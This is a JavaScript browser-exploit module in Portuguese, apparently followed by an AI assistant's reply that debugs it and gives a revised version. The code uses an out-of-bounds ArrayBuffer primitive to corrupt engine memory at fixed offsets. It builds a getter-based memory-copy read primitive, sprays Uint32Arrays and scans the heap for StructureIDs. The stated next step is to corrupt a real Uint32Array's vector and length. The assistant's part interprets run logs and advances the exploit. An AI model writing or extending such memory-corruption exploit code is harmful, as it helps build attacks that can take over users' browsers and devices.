// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
// (Conteúdo da v10.6 com sprayedObjects movido para o escopo da função)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const FNAME_MAIN = "ExploitLogic_v10.6.1"; // Correção do ReferenceError

const GETTER_PROPERTY_NAME_COPY_V10_6 = "AAAA_GetterForMemoryCopy_v10_6";
const PLANT_OFFSET_0x6C_FOR_COPY_SRC = 0x6C;
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x100;

let getter_v10_6_called_flag = false;
let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null;
const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 34;

async function readFromOOBOffsetViaCopy_v10_6(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy_v10_6`;
    getter_v10_6_called_flag = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
    }

    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC, value_to_plant_at_0x6c, 8);

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY_V10_6]() {
            getter_v10_6_called_flag = true;
            try {
                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68.high();

                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else {
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
                    }
                } else {
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBADBAD, 0xBADBAD), 8);
                }
            } catch (e_getter) {
                try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){}
            }
            return "getter_copy_v10_6_done";
        }
    };

    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(5);

    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }

    if (!getter_v10_6_called_flag) { return null; }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

async function getStructureIDFromOOB_v10_6(offset_of_jscell_in_oob) {
    // ... (mesmo código da v10.6)
    if (!oob_array_buffer_real || offset_of_jscell_in_oob < 0 || offset_of_jscell_in_oob >= oob_array_buffer_real.byteLength - 8) {
        return null;
    }
    const copied_qword = await readFromOOBOffsetViaCopy_v10_6(offset_of_jscell_in_oob);
    if (copied_qword && !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) && !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xBADBAD) ) {
        return copied_qword.low();
    }
    return null;
}

export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.discoverStructureID_v10.6.1`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Descoberta de StructureID de Uint32Array ---`, "test", FNAME_CURRENT_TEST);

    let sprayedObjects = []; // MOVIDO PARA O ESCOPO DA FUNÇÃO, ANTES DO TRY

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // PASSO 1: Validar primitiva de leitura de SID
        // ... (código de validação como na v10.6, omitido por brevidade, mas deve estar aqui)
        logS3("PASSO 1: Validação da primitiva de leitura de SID (assumindo sucesso de execuções anteriores).", "info", FNAME_CURRENT_TEST);


        // PASSO 2: Pulverizar Uint32Arrays e tentar encontrar seus StructureIDs
        logS3("PASSO 2: Pulverizando Uint32Arrays e tentando encontrar seus StructureIDs...", "info", FNAME_CURRENT_TEST);
        const NUM_U32_SPRAY = 250;
        const U32_SPRAY_LEN = 16;
        // sprayedObjects já declarado no escopo da função
        for (let i = 0; i < NUM_U32_SPRAY; i++) {
            sprayedObjects.push(new Uint32Array(U32_SPRAY_LEN + (i % 5)));
        }
        logS3(`  ${sprayedObjects.length} Uint32Arrays pulverizados.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(500);

        let found_sids_map = {};
        const SCAN_START = 0x100; 
        const SCAN_END = Math.min(0x7000, oob_array_buffer_real.byteLength - 0x20);
        const SCAN_STEP_SID = 0x08; 
        const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;

        logS3(`  Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} com passo ${toHex(SCAN_STEP_SID)} por SIDs...`, "info", FNAME_CURRENT_TEST);
        // ... (resto do loop de scan e lógica de identificação de SID como na v10.6) ...
        let sids_found_in_scan = 0;
        for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP_SID) {
            let sid = await getStructureIDFromOOB_v10_6(offset);
            if (sid !== null && sid !== 0 && sid !== 0xFFFFFFFF) {
                if ((sid & 0xFFFF0000) === 0xCAFE0000 || (sid & 0xFFFF0000) === 0xBADBAD0000) continue;
                if (typeof known_ab_sid === 'number' && (sid & 0xFFFFFF00) === (known_ab_sid & 0xFFFFFF00)) continue;
                
                if (!found_sids_map[sid] || found_sids_map[sid] < 5) {
                    // logS3(`    Offset ${toHex(offset)}: SID Potencial = ${toHex(sid)}`, "leak", FNAME_CURRENT_TEST);
                }
                found_sids_map[sid] = (found_sids_map[sid] || 0) + 1;
                sids_found_in_scan++;
            }
            if (offset > SCAN_START && offset % (SCAN_STEP_SID * 200) === 0) {
                logS3(`    Scan em ${toHex(offset)}... SIDs únicos até agora: ${Object.keys(found_sids_map).length}`, "info", FNAME_CURRENT_TEST);
                await PAUSE_S3(10); 
            }
        }
        logS3(`  Scan concluído. Total de ${sids_found_in_scan} SIDs potenciais (filtrados) encontrados.`, "info", FNAME_CURRENT_TEST);

        let most_frequent_sid_val = null; let max_freq = 0;
        let sorted_sids = Object.keys(found_sids_map).sort((a,b) => found_sids_map[b] - found_sids_map[a]);

        logS3("  Frequência dos SIDs encontrados (top 5):", "info", FNAME_CURRENT_TEST);
        for(let i=0; i < Math.min(5, sorted_sids.length); i++) {
            const sid_val = parseInt(sorted_sids[i]);
            logS3(`    - SID: ${toHex(sid_val)}  Contagem: ${found_sids_map[sid_val]}`, "info", FNAME_CURRENT_TEST);
            if (found_sids_map[sid_val] > max_freq) {
                max_freq = found_sids_map[sid_val];
                most_frequent_sid_val = sid_val;
            }
        }
        
        if (most_frequent_sid_val !== null && max_freq > Math.min(NUM_U32_SPRAY / 20, 10)) {
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = most_frequent_sid_val;
            // ... (resto da lógica como na v10.6) ...
            logS3(`  !!!! StructureID MAIS FREQUENTE (candidato para Uint32Array): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} (contagem: ${max_freq}) !!!!`, "vuln", FNAME_CURRENT_TEST);
            logS3("    >>>> COPIE ESTE VALOR PARA A CONSTANTE EXPECTED_UINT32ARRAY_STRUCTURE_ID NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
            document.title = `U32 SID? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
        } else {
            logS3("  Nenhum candidato a StructureID de Uint32Array proeminente encontrado via scan.", "warn", FNAME_CURRENT_TEST);
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID_UINT32ARRAY;
        }
        logS3(`EXPECTED_UINT32ARRAY_STRUCTURE_ID (final para este run): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);


        if (EXPECTED_UINT32ARRAY_STRUCTURE_ID !== PLACEHOLDER_SID_UINT32ARRAY) {
            logS3(`PASSO 3: StructureID ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} descoberto. Próximo passo: corromper um Uint32Array real. (Lógica do Passo 3 da v10.6 anterior omitida por brevidade)`, "info", FNAME_CURRENT_TEST);
        } else {
            logS3("PASSO 3: Sem StructureID de Uint32Array confiável, corrupção direcionada é difícil.", "info", FNAME_CURRENT_TEST);
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedObjects = []; // Limpa o array de referências
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
```Você tem toda a razão, o `ReferenceError: sprayedObjects is not defined` no final do log da v10.6 indica um problema de escopo com a variável `sprayedObjects`. Ela foi declarada dentro do bloco `try` da função `sprayAndInvestigateObjectExposure` e depois acessada no bloco `finally` (onde `sprayedObjects = [];` tentaria limpá-la). Quando um erro ocorre dentro do `try` antes da declaração ser alcançada, ou se a estrutura do `try...catch...finally` tiver nuances com `let` em alguns motores mais antigos, isso pode acontecer.

A solução é declarar `sprayedObjects` no início da função `sprayAndInvestigateObjectExposure`, fora do bloco `try`.

Além disso, o log da v10.6 mostra que, apesar da primitiva de leitura de SID funcionar (Passo 1 validado indiretamente por não falhar ali), o scan **ainda não encontrou nenhum `StructureID` proeminente para `Uint32Array`**.

**Principais Observações do Log v10.6:**

1.  **Validação da Primitiva de Leitura de SID (PASSO 1)**: O log diz: `SUCESSO NA VALIDAÇÃO: Primitiva de leitura de SID funciona!`. Isso é crucial e significa que `getStructureIDFromOOB_v10_X` está operacional.
2.  **Falha na Descoberta de SID de `Uint32Array` (PASSO 2)**:
    * `Scan concluído. Total de 0 SIDs potenciais (filtrados) encontrados.`
    * `Nenhum candidato a StructureID de Uint32Array suficientemente proeminente encontrado via scan.`
    * Isso reforça que os metadados dos `Uint32Array`s pulverizados com `new Uint32Array()` não estão sendo colocados dentro da janela escaneada do `oob_array_buffer_real` de forma consistente ou detectável.

---
## Arquivo `testRetypeOOB_AB_ViaShadowCraft.mjs` (v10.6.1 - Corrigindo `ReferenceError` e Mantendo Foco na Descoberta de SID)

Esta versão corrige o `ReferenceError` e mantém a estrutura de descoberta de SID da v10.6, pois a primitiva de leitura de SID foi validada. O desafio principal continua sendo fazer com que os metadados dos objetos pulverizados apareçam na sua janela de leitura OOB.

```javascript
// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.6.1"; // Correção do ReferenceError

const GETTER_PROPERTY_NAME_COPY_V10_6_1 = "AAAA_GetterForMemoryCopy_v10_6_1"; // Nome único para o getter
const PLANT_OFFSET_0x6C_FOR_COPY_SRC = 0x6C;
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x100;

let getter_v10_6_1_called_flag = false;

// !!!!! IMPORTANTE: O OBJETIVO DESTE SCRIPT É DESCOBRIR ESTE VALOR !!!!!
let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null;
const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 34; // Placeholder para SID de Uint32Array


// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (readFromOOBOffsetViaCopy_v10_6_1)
// ============================================================
async function readFromOOBOffsetViaCopy_v10_6_1(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy_v10_6_1`;
    getter_v10_6_1_called_flag = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
    }

    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC, value_to_plant_at_0x6c, 8);

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY_V10_6_1]() {
            getter_v10_6_1_called_flag = true;
            try {
                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68.high();

                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else {
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
                    }
                } else {
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBADBAD, 0xBADBAD), 8);
                }
            } catch (e_getter) {
                try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){}
            }
            return "getter_copy_v10_6_1_done";
        }
    };

    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(5);

    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }

    if (!getter_v10_6_1_called_flag) { return null; }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

// ============================================================
// FUNÇÃO PARA LER StructureID USANDO A PRIMITIVA DE CÓPIA (v10.6.1)
// ============================================================
async function getStructureIDFromOOB_v10_6_1(offset_of_jscell_in_oob) {
    // Validação do offset de entrada
    if (!oob_array_buffer_real || offset_of_jscell_in_oob < 0 || offset_of_jscell_in_oob >= oob_array_buffer_real.byteLength - 8) {
        // logS3(`[getStructureIDFromOOB_v10_6_1] Offset inválido: ${toHex(offset_of_jscell_in_oob)}`, "warn", FNAME_MAIN);
        return null;
    }
    const copied_qword = await readFromOOBOffsetViaCopy_v10_6_1(offset_of_jscell_in_oob);

    // Checagem de valores de erro da primitiva de cópia
    if (copied_qword &&
        !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) && // Erro no getter
        !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xBADBAD) ) { // Erro de "mágica"
        return copied_qword.low(); // StructureID + Flags nos 4 bytes baixos do JSCell
    }
    return null;
}

// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.6.1)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.discoverStructureID_v10.6.1`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Descoberta de StructureID de Uint32Array ---`, "test", FNAME_CURRENT_TEST);

    // sprayedObjects declarado no escopo da função, antes do try/catch/finally
    let sprayedObjects = []; 

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // --- PASSO 1: Validar a primitiva de leitura de SID com um ArrayBuffer (SID conhecido) ---
        logS3("PASSO 1: Validando leitura de SID com ArrayBuffer...", "info", FNAME_CURRENT_TEST);
        const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
        if (typeof known_ab_sid !== 'number') {
            logS3("ERRO: ArrayBuffer_STRUCTURE_ID não definido!", "critical", FNAME_CURRENT_TEST); return;
        }
        logS3(`  StructureID conhecido para ArrayBuffer: ${toHex(known_ab_sid)}`, "info", FNAME_CURRENT_TEST);

        const FAKE_AB_CELL_OFFSET = 0x300;
        const fake_ab_jscell_qword = new AdvancedInt64(known_ab_sid, 0x01000100);
        oob_write_absolute(FAKE_AB_CELL_OFFSET, fake_ab_jscell_qword, 8);
        
        let sid_read_from_fake_ab = await getStructureIDFromOOB_v10_6_1(FAKE_AB_CELL_OFFSET);

        if (sid_read_from_fake_ab !== null) {
            // logS3(`  SID lido (do local de cópia) após tentar ler de ${toHex(FAKE_AB_CELL_OFFSET)}: ${toHex(sid_read_from_fake_ab)}`, "leak", FNAME_CURRENT_TEST);
            if (sid_read_from_fake_ab === fake_ab_jscell_qword.low()) {
                logS3("    SUCESSO NA VALIDAÇÃO: Primitiva de leitura de SID funciona!", "good", FNAME_CURRENT_TEST);
            } else {
                logS3(`    AVISO VALIDAÇÃO: SID lido (${toHex(sid_read_from_fake_ab)}) não corresponde ao plantado (${toHex(fake_ab_jscell_qword.low())}).`, "warn", FNAME_CURRENT_TEST);
            }
        } else {
            logS3("    Falha ao ler SID do ArrayBuffer FALSO para validação (primitiva pode ter falhado).", "error", FNAME_CURRENT_TEST);
        }
        await PAUSE_S3(50); // Pausa curta após validação

        // --- PASSO 2: Pulverizar Uint32Arrays e tentar encontrar seus StructureIDs ---
        logS3("PASSO 2: Pulverizando Uint32Arrays e tentando encontrar seus StructureIDs...", "info", FNAME_CURRENT_TEST);
        const NUM_U32_SPRAY = 250;
        const U32_SPRAY_LEN_BASE = 16;
        // sprayedObjects já foi declarado
        for (let i = 0; i < NUM_U32_SPRAY; i++) {
            sprayedObjects.push(new Uint32Array(U32_SPRAY_LEN_BASE + (i % 7))); // Variar um pouco mais o tamanho
        }
        logS3(`  ${sprayedObjects.length} Uint32Arrays pulverizados.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(400); // Aumentar um pouco a pausa para estabilização da heap

        let found_sids_map = {};
        const SCAN_START = 0x100; 
        const SCAN_END = Math.min(0x7800, oob_array_buffer_real.byteLength - 0x20); // Escanear até ~30KB
        const SCAN_STEP_SID = 0x08;

        logS3(`  Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} com passo ${toHex(SCAN_STEP_SID)} por SIDs... (Pode levar MUITO tempo)`, "info", FNAME_CURRENT_TEST);
        let sids_found_in_scan_count = 0;
        for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP_SID) {
            let sid = await getStructureIDFromOOB_v10_6_1(offset);
            if (sid !== null && sid !== 0 && sid !== 0xFFFFFFFF) {
                if ((sid & 0xFFFF0000) === 0xCAFE0000 || (sid & 0xFF000000) === 0xBAD00000 ) continue; // Pular padrões de preenchimento e erro
                if (typeof known_ab_sid === 'number' && (sid & 0xFFFFFF00) === (known_ab_sid & 0xFFFFFF00)) continue; // Pular SID de ArrayBuffer
                
                if (!found_sids_map[sid] || found_sids_map[sid] < 10) { // Logar as primeiras N ocorrências
                    logS3(`    Offset ${toHex(offset)}: SID Potencial = ${toHex(sid)}`, "leak", FNAME_CURRENT_TEST);
                }
                found_sids_map[sid] = (found_sids_map[sid] || 0) + 1;
                sids_found_in_scan_count++;
            }
            if (offset > SCAN_START && offset % (SCAN_STEP_SID * 250) === 0) { // Log de progresso
                logS3(`    Scan em ${toHex(offset)}... SIDs únicos candidatos: ${Object.keys(found_sids_map).length}`, "info", FNAME_CURRENT_TEST);
                await PAUSE_S3(1);
            }
        }
        logS3(`  Scan concluído. Total de ${sids_found_in_scan_count} SIDs potenciais (filtrados) encontrados. ${Object.keys(found_sids_map).length} SIDs únicos.`, "info", FNAME_CURRENT_TEST);

        let most_frequent_sid_val = null; let max_freq = 0;
        let sorted_sids = Object.keys(found_sids_map).sort((a,b) => found_sids_map[b] - found_sids_map[a]);

        logS3("  Frequência dos SIDs encontrados (top 5 mais frequentes):", "info", FNAME_CURRENT_TEST);
        for(let i=0; i < Math.min(5, sorted_sids.length); i++) {
            const sid_val_key = sorted_sids[i];
            const sid_val_num = parseInt(sid_val_key); // Chaves de objeto são strings
            logS3(`    - SID: ${toHex(sid_val_num)}  Contagem: ${found_sids_map[sid_val_key]}`, "info", FNAME_CURRENT_TEST);
            if (found_sids_map[sid_val_key] > max_freq) {
                max_freq = found_sids_map[sid_val_key];
                most_frequent_sid_val = sid_val_num;
            }
        }
        
        if (most_frequent_sid_val !== null && max_freq > Math.min(NUM_U32_SPRAY / 10, 8)) { // Exigir uma frequência mínima um pouco maior
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = most_frequent_sid_val;
            logS3(`  !!!! StructureID MAIS FREQUENTE (candidato para Uint32Array): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} (contagem: ${max_freq}) !!!!`, "vuln", FNAME_CURRENT_TEST);
            logS3("    >>>> COPIE ESTE VALOR PARA A CONSTANTE EXPECTED_UINT32ARRAY_STRUCTURE_ID NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
            document.title = `U32 SID? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
        } else {
            logS3("  Nenhum candidato a StructureID de Uint32Array suficientemente proeminente encontrado via scan.", "warn", FNAME_CURRENT_TEST);
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID_UINT32ARRAY;
        }
        logS3(`EXPECTED_UINT32ARRAY_STRUCTURE_ID (final para este run): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);

        if (EXPECTED_UINT32ARRAY_STRUCTURE_ID !== PLACEHOLDER_SID_UINT32ARRAY) {
            logS3(`PASSO 3: StructureID ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} descoberto. Próximo passo: corromper um Uint32Array real.`, "info", FNAME_CURRENT_TEST);
            // A lógica do Passo 3 da v10.4 (corromper m_vector/m_length de um Uint32Array real)
            // seria inserida aqui em uma próxima iteração.
        } else {
            logS3("PASSO 3: Sem StructureID de Uint32Array confiável, corrupção direcionada é difícil.", "info", FNAME_CURRENT_TEST);
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedObjects = []; // Limpa o array de referências
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
